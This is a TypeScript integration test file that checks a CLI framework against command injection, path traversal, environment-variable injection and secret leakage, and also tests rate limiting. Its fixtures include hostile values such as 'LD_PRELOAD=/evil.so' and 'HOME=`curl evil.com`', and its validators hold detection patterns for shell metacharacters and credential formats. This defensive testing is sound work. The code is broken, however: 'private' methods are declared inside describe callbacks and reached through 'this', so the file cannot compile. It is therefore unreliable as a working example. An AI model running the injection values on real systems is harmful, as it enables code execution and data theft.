/**
 * CLI + Security Integration Tests
 * Tests safe command execution with input validation
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { TestScenario } from '../../src/domain/orchestration/entities.js';
import {
  ScenarioId,
  PackageId,
  Duration
} from '../../src/domain/orchestration/value-objects.js';
import { IntegrationTestDataFactory } from '../../src/domain/data-generation/factories.js';

describe('CLI + Security Integration', () => {
  let factory: IntegrationTestDataFactory;
  let testData: ReturnType<typeof factory.createCLISecurityScenario>;

  beforeAll(() => {
    factory = new IntegrationTestDataFactory();
    testData = factory.createCLISecurityScenario();
  });

  describe('Command Argument Validation', () => {
    it('should validate command arguments before execution', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'cli-argument-validation',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(20)
      );

      scenario.setTestFunction(async () => {
        const { commands } = testData;

        for (const cmd of commands.commands) {
          // Validate each argument
          for (const arg of cmd.args) {
            const isValid = this.validateArgument(arg);
            expect(typeof isValid).toBe('boolean');

            // Arguments should not contain malicious content
            if (arg.includes(';') || arg.includes('|') || arg.includes('`')) {
              expect(isValid).toBe(false);
            }
          }
        }
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });

    private validateArgument(arg: string): boolean {
      // Check for command injection patterns
      if (/[;&|`$()]/.test(arg)) return false;

      // Check for path traversal
      if (/\.\.\//.test(arg)) return false;

      // Check length
      if (arg.length > 1000) return false;

      return true;
    }
  });

  describe('Malicious Command Prevention', () => {
    it('should block commands with injection attempts', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'block-malicious-commands',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(20)
      );

      scenario.setTestFunction(async () => {
        const { maliciousInputs } = testData;

        for (const injection of maliciousInputs.commandInjection) {
          const result = this.executeCommand('test', [injection]);
          expect(result.blocked).toBe(true);
          expect(result.reason).toContain('injection');
        }

        // Verify valid commands pass through
        const { validInputs } = testData;
        for (const validCmd of validInputs.commands) {
          const [cmd, ...args] = validCmd.split(' ');
          const result = this.executeCommand(cmd, args);
          expect(result.blocked).toBe(false);
        }
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });

    private executeCommand(
      cmd: string,
      args: string[]
    ): { blocked: boolean; reason?: string } {
      // Check command name
      if (!/^[a-z-]+$/.test(cmd)) {
        return { blocked: true, reason: 'Invalid command name' };
      }

      // Check arguments for injection
      for (const arg of args) {
        if (/[;&|`$()]/.test(arg)) {
          return { blocked: true, reason: 'Command injection detected' };
        }
      }

      return { blocked: false };
    }
  });

  describe('Path Argument Validation', () => {
    it('should validate file paths in command arguments', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'path-argument-validation',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(15)
      );

      scenario.setTestFunction(async () => {
        const { maliciousInputs, validInputs } = testData;

        // Test malicious paths are rejected
        for (const path of maliciousInputs.pathTraversal) {
          const result = this.validatePath(path);
          expect(result.valid).toBe(false);
        }

        // Test valid paths are accepted
        for (const path of validInputs.paths) {
          const result = this.validatePath(path);
          expect(result.valid).toBe(true);
        }
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });

    private validatePath(path: string): { valid: boolean; error?: string } {
      // Check for traversal
      if (/\.\.\//.test(path) || /\.\.\\/.test(path)) {
        return { valid: false, error: 'Path traversal detected' };
      }

      // Check for absolute sensitive paths
      if (/^\/etc\//.test(path) || /^\\windows\\/i.test(path)) {
        return { valid: false, error: 'Access to sensitive path denied' };
      }

      // Check for null bytes
      if (path.includes('\0')) {
        return { valid: false, error: 'Null byte in path' };
      }

      return { valid: true };
    }
  });

  describe('Environment Variable Security', () => {
    it('should prevent environment variable injection', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'env-var-injection-prevention',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(15)
      );

      scenario.setTestFunction(async () => {
        const dangerousEnvVars = [
          'PATH=/tmp:$PATH',
          'LD_PRELOAD=/evil.so',
          'HOME=`curl evil.com`'
        ];

        for (const envVar of dangerousEnvVars) {
          const result = this.validateEnvVar(envVar);
          expect(result.valid).toBe(false);
        }

        // Valid env vars should pass
        const validEnvVars = ['NODE_ENV=test', 'DEBUG=true', 'PORT=3000'];

        for (const envVar of validEnvVars) {
          const result = this.validateEnvVar(envVar);
          expect(result.valid).toBe(true);
        }
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });

    private validateEnvVar(envVar: string): { valid: boolean; error?: string } {
      // Check format
      if (!/^[A-Z_][A-Z0-9_]*=.+$/.test(envVar)) {
        return { valid: false, error: 'Invalid format' };
      }

      const [, value] = envVar.split('=');

      // Check for command substitution
      if (/[$`]/.test(value)) {
        return { valid: false, error: 'Command substitution detected' };
      }

      // Check for path manipulation
      if (value.includes(':/') || value.includes(':\\')) {
        return { valid: false, error: 'Path manipulation detected' };
      }

      return { valid: true };
    }
  });

  describe('Secret Exposure Prevention in CLI', () => {
    it('should prevent secrets from being logged or displayed', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'secret-exposure-prevention',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(15)
      );

      scenario.setTestFunction(async () => {
        const { maliciousInputs } = testData;

        for (const secret of maliciousInputs.secrets) {
          const sanitized = this.sanitizeForDisplay(secret);

          // Secret should be masked
          expect(sanitized).not.toBe(secret);
          expect(sanitized).toContain('***');

          // Original secret should not appear in sanitized output
          if (secret.length > 10) {
            const secretSubstring = secret.substring(0, 10);
            expect(sanitized).not.toContain(secretSubstring);
          }
        }
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });

    private sanitizeForDisplay(input: string): string {
      const patterns = [
        { regex: /AKIA[0-9A-Z]{16}/, replacement: 'AKIA***' },
        { regex: /ghp_[a-zA-Z0-9]{36}/, replacement: 'ghp_***' },
        { regex: /sk-ant-api03-[a-zA-Z0-9-_]{40,}/, replacement: 'sk-ant-***' },
        {
          regex: /postgres:\/\/([^:]+):([^@]+)@/,
          replacement: 'postgres://***:***@'
        },
        {
          regex: /-----BEGIN.*PRIVATE KEY-----/,
          replacement: '***PRIVATE KEY***'
        }
      ];

      let sanitized = input;
      for (const { regex, replacement } of patterns) {
        sanitized = sanitized.replace(regex, replacement);
      }

      return sanitized;
    }
  });

  describe('Rate Limiting for CLI Commands', () => {
    it('should enforce rate limits to prevent abuse', async () => {
      const scenario = new TestScenario(
        ScenarioId.generate(),
        'cli-rate-limiting',
        [new PackageId('cli-framework'), new PackageId('security')],
        Duration.seconds(20)
      );

      scenario.setTestFunction(async () => {
        const rateLimiter = new SimpleRateLimiter(5, 1000); // 5 requests per second

        // Rapid fire requests
        const results: boolean[] = [];
        for (let i = 0; i < 10; i++) {
          const allowed = rateLimiter.checkLimit('test-command');
          results.push(allowed);
        }

        // First 5 should pass, rest should be blocked
        const allowed = results.filter(r => r).length;
        expect(allowed).toBeLessThanOrEqual(5);
        expect(results.slice(5).some(r => !r)).toBe(true);

        // After waiting, should allow more
        await new Promise(resolve => setTimeout(resolve, 1100));
        const afterWait = rateLimiter.checkLimit('test-command');
        expect(afterWait).toBe(true);
      });

      const result = await scenario.execute();
      expect(result.passed).toBe(true);
    });
  });
});

class SimpleRateLimiter {
  private requests: Map<string, number[]> = new Map();

  constructor(private maxRequests: number, private windowMs: number) {}

  checkLimit(key: string): boolean {
    const now = Date.now();
    const requests = this.requests.get(key) || [];

    // Remove old requests outside window
    const validRequests = requests.filter(time => now - time < this.windowMs);

    if (validRequests.length >= this.maxRequests) {
      return false;
    }

    validRequests.push(now);
    this.requests.set(key, validRequests);
    return true;
  }
}
